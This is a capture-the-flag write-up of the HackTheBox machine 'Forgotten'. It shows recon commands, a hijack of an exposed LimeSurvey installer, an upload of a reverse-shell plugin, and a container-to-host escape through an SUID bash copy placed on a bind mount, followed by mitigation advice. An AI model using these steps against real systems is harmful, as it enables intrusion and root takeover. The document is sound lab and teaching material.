# Forgotten - HackTheBox Writeup

**Date:** 2026-03-19
**OS:** Linux
**IP Address:** 10.129.234.81
**Difficulty:** Medium
**Points:** 30

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Forgotten**. 

*   **Initial Access:** Gained via an Authenticated Remote Code Execution (RCE) in LimeSurvey, which allowed access to a Docker container.
*   **Privilege Escalation:** Escalated to root in the container using discovered environment credentials, then Pivoted to the host and exploited a bind mount misconfiguration to gain root access on the target machine.
*   **Key Learning Points:** 
    * Docker container security and bind mounts.
    * Post-exploitation in containerized environments.
    * Credential reuse and SUID abuse.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 22/tcp | SSH | OpenSSH 8.9p1 (Ubuntu) | Standard SSH access. |
| 80/tcp | HTTP | Apache httpd 2.4.56 (Debian) | Root `/` returns 403 Forbidden. |

**Nmap Command:**
```bash
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A 10.129.234.81
```

## 2.2. Web Enumeration
**Strategy:** Directory Brute Forcing with `feroxbuster` revealed a `/survey/` directory running LimeSurvey.

### Directory Brute Forcing
```bash
feroxbuster -u http://10.129.234.81/survey/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,bak
```

**Significant Findings:**
- `http://10.129.234.81/` -> **403 Forbidden**.
- `http://10.129.234.81/survey/` -> Redirects to an **unfinished LimeSurvey installation wizard** (`index.php?r=installer/welcome`).

---

# 3. Initial Access (User Flag)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** Incomplete Configuration & Authenticated Remote Code Execution (RCE).
*   **Vector:** The LimeSurvey installation wizard was exposed at `/survey/index.php?r=installer/welcome`. This allowed an attacker to finish the setup and connect it to a database they controlled.

## 3.2. Exploitation Path
1.  **Preparation:** The attacker deployed a local **MySQL instance** using `podman` to act as the backend for the target's LimeSurvey.
    ```bash
    podman run -d --name ctf-mysql -e MYSQL_ROOT_PASSWORD=1234 -e MYSQL_DATABASE=lime -e MYSQL_USER=bird -e MYSQL_PASSWORD=1234 -p 3306:3306 -v mysql_data:/var/lib/mysql docker.io/library/mysql:8.0
    ```
2.  **Hijacking the Installation:** By navigating to the installer on the target machine, the attacker provided their local machine's IP as the database host. This effectively "orphaned" the target's intended configuration and allowed the attacker to set a new administrative password (`admin:admin`).
3.  **Gaining a Foothold (RCE)**: With administrative access, the attacker turned to the **Plugin Manager**.
    *   **Preparation**: The attacker customized a malicious plugin. They updated the **IP address** in the PHP reverse shell (`php-rev.php`) to their listener IP and matched the **version number** in `config.xml` with the target's LimeSurvey version.
    *   **Exploitation**: The customized files were zipped as `0xB1rd.zip` and uploaded to achieve **Remote Code Execution**.
4.  **Container Shell**: Triggering the shell provided a connection to a **Docker container** running as the user `limesvc`.
5.  **Credential Discovery**: Enumerating the container's environment variables revealed a password: `LIMESURVEY_PASS=5W5HN4K4GCXf9E`.
6.  **SSH Login**: This password was reused for the `limesvc` user on the host system. The attacker SSHed into the host to stabilize their access.
    ```bash
    ssh limesvc@forgotten.htb
    ```

**User Flag:**
After stabilizing the shell via SSH, the user flag was found in the home directory.
```bash
limesvc@forgotten:~$ cat user.txt
# 0db0db45421f78eec968a8e9bc107544
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Local Enumeration
Post-exploitation enumeration within the Docker container revealed a critical misconfiguration:
*   **Sudo Privileges**: The `limesvc` user in the container had full `sudo` privileges (`(ALL : ALL) ALL`).
*   **Bind Mount Discovery**: Using `findmnt`, the attacker discovered that the container directory `/var/www/html/survey` was a **bind mount** from the host's `/opt/limesurvey` directory.

## 4.2. Exploitation Path (The "Bind Mount" Breakout)
The exploitation relies on the fact that files created by the `root` user inside a container on a bind mount are also owned by `root` on the host system.

1.  **Escalate to Root in Container**:
```text
limesvc@container:~$ sudo su -
root@container:~# whoami
root
```
2.  **Create an SUID Backdoor**: As root in the container, the attacker copied the standard `/bin/bash` binary to the bind-mounted directory and assigned it the SUID and SGID bits.
```text
root@container:~# cp /bin/bash /var/www/html/survey/0xB1rd
root@container:~# chmod 6777 /var/www/html/survey/0xB1rd
```
    *Note: `6777` sets the SUID (4000) and SGID (2000) bits, making the binary execute with the permissions of the file owner (root).*

3.  **Execute on the Host**: Switching back to the host SSH session (as `limesvc`), the attacker verified that the binary `0xB1rd` was present in `/opt/limesurvey/` and owned by root with the SUID bit set.
4.  **Full System Root**: By executing the binary with the `-p` flag, the attacker gained a shell that maintained the effective root UID.
```text
limesvc@forgotten:/opt/limesurvey$ ./0xB1rd -p
0xB1rd-5.1# whoami
root
```

**Vulnerability:**
1. **Insecure Container Configuration**: Providing full sudo access inside a container.
2. **Dangerous Bind Mount**: Mounting a host directory into a container with write access, allowing for SUID binary injection.

**Root Flag:**
```text
0xB1rd-5.1# cat /root/root.txt
# 11993bd0f03395124611c3cc3f2f99ad
```

---

# 5. Credentials & Loot

| Type | Username | Password / Hash | Source |
| :--- | :--- | :--- | :--- |
| Database | bird | 1234 | `database_notes` |
| Admin | admin | admin | Setup Bypass |
| System | limesvc | 5W5HN4K4GCXf9E | `env` / `database_notes` |
| **User Flag** | **limesvc** | **0db0db45421f78eec968a8e9bc107544** | `/home/limesvc/user.txt` |
| **Root Flag** | **root** | **11993bd0f03395124611c3cc3f2f99ad** | `/root/root.txt` |

---

# 6. Recommendations & Mitigation

1. **Secure Installation Flows**: Never leave web application installation scripts exposed or unfinished on production servers. Use firewall rules to restrict access to setup wizards. Ensure that the installation directory (like `/installer`) is deleted or disabled immediately after setup.
2. **Secure Mount Points**: Be extremely cautious with bind mounts between a container and the host. Shared directories should be mounted with `nosuid` and `nodev` options (e.g., in `docker-compose.yml` or `podman` flags) to prevent SUID-based privilege escalation. Direct mounting of host `/opt` or system directories to a container with write access is a high security risk.
3. **Application Security & Hardening**: 
    - Disable plugin installation features in production if not strictly required.
    - Implement file upload restrictions (e.g., file type validation, malware scanning) for all uploaded extensions.
4. **Least Privilege (Containers & Sudo)**: 
    - Ensure that service accounts within containers do not have broad sudo privileges. 
    - Avoid allowing sudo access to powerful binaries like `php`, `python`, `perl`, or `bash`, which can be easily used to spawn root shells (GTFOBins).
5. **Credential Management & Env Security**: Implement a strict no-reuse policy for passwords. Avoid storing sensitive information like passwords or API keys in environment variables, where they can be leaked via common misconfigurations or discovery. Use encrypted secret stores (e.g., HashiCorp Vault, Kubernetes Secrets).
6. **Continuous Monitoring & Auditing**:
    - Regularly audit the host filesystem for unauthorized SUID/SGID binaries.
    - Monitor application logs for unauthorized access to administrative panels or unusual file upload activity.


